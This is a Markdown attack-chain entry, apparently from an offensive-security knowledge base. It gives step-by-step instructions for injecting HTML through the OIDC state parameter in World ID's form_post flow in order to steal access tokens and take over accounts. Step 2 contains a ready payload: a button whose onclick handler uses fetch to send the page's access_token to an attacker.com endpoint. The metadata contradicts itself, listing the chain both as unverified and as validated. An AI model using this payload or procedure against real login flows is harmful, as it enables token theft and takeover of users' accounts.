---
id: ac-uuid-placeholder-001
tags:
  - xss
  - html-injection
  - oidc
  - token-theft
  - ato
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-State-Parameter-Validation-Issue]]'
  - '[[procedures/Inject-Malicious-HTML-for-Token-Theft]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:55:38.102Z'
description: >-
  Attack chain exploiting insufficient filtering of the state parameter in World
  ID OIDC form_post response mode to inject HTML, enabling theft of access
  tokens for account takeover.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# HTML Injection in OIDC State Parameter Leading to Access Token Theft and Account Takeover

Multi-stage attack chain demonstrating exploitation of insufficient state parameter filtering in World ID OIDC authentication to inject HTML, leading to access token exfiltration and potential account takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Validation Flaw] --> B[Inject Malicious HTML]
    B --> C[Steal Access Token]
    C --> D[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]
- Browser Developer Tools

### Target Environment

- Web platform with OIDC authentication (e.g., World ID)
- form_post response mode enabled
- Access to authentication flow

### Initial Access Requirements

- Valid user session or ability to initiate OIDC login
- Network access to the target authentication endpoint
- No prior credentials needed beyond starting the auth flow

## Detailed Attack Procedures

### Step 1: Identify State Parameter Validation Issue
procedure: [[procedures/Identify-State-Parameter-Validation-Issue]]

**Objective**: Detect lack of filtering in the OIDC state parameter to confirm HTML injection feasibility.

**Instructions**: Intercept the OIDC authentication request using a proxy like Burp Suite. Modify the state parameter to include HTML tags (e.g., `<script>alert(1)</script>`) and observe if it renders in the response body without sanitization.

**Expected Output**: Unsanitized HTML appears in the form_post response, indicating injection vulnerability.

**Success Indicators**:
- HTML tags render as executable content in the browser
- No CSP blocks basic HTML injection (XSS mitigated but HTML allowed)

### Step 2: Inject Malicious HTML for Token Theft
procedure: [[procedures/Inject-Malicious-HTML-for-Token-Theft]]

**Objective**: Craft and inject HTML payload to create a form that posts the access token to an attacker-controlled endpoint upon user interaction.

**Instructions**: In the intercepted request, set the state parameter to a payload like `<button onclick="fetch('https://attacker.com/steal?token=' + document.querySelector('input[name=access_token]').value)">Click Me</button>`. Complete the auth flow and interact with the injected element to exfiltrate the token.

**Expected Output**: Access token sent to attacker server via POST or fetch request.

**Success Indicators**:
- Token received on attacker endpoint
- User prompted to click injected button with minimal interaction

## Attack Chain Summary

### Key Achievements

1. Confirmed HTML injection in OIDC state parameter
2. Exfiltrated access token via injected form/button
3. Enabled potential account takeover despite CSP mitigation on full XSS

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
